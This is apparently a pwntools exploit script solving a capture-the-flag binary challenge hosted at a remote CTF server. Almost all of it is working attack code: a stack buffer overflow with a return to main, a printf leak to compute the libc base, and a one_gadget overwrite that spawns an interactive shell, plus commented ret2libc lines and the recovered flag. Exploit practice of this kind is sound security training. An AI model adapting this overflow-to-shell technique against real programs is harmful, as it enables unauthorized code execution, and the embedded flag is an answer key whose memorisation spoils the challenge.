#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug =2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31568)
	libc = ELF("./libc-2.28.so",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)
pop_rdi = 0x00000000004012a3
addr_main = 0x0000000000401186

pd = 'a'*0x28
pd += p64(addr_main)
sla("where is this place? can you help me get there safely?\n",pd)
p.recvuntil("rob said i'd need this to get there: ")
printf_addr = int(p.recv(12),16)
libc.address = printf_addr - libc.sym['printf']
sys_addr = libc.sym['system']
bin_sh = libc.address + libc.search("/bin/sh").next()

pd = 'a'*0x28
pd += p64(libc.address + 0x4484f)
# pd += p64(pop_rdi)
# pd += p64(bin_sh)
# pd += p64(sys_addr)
# ???? one is ok but system("/bin/sh") wrong
sla("where is this place? can you help me get there safely?\n",pd)
success("printf_addr = " + hex(printf_addr))
success("libc.address = " + hex(libc.address))
success("sys_addr = " + hex(sys_addr))
success("bin_sh = " + hex(bin_sh))
# flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}

ti()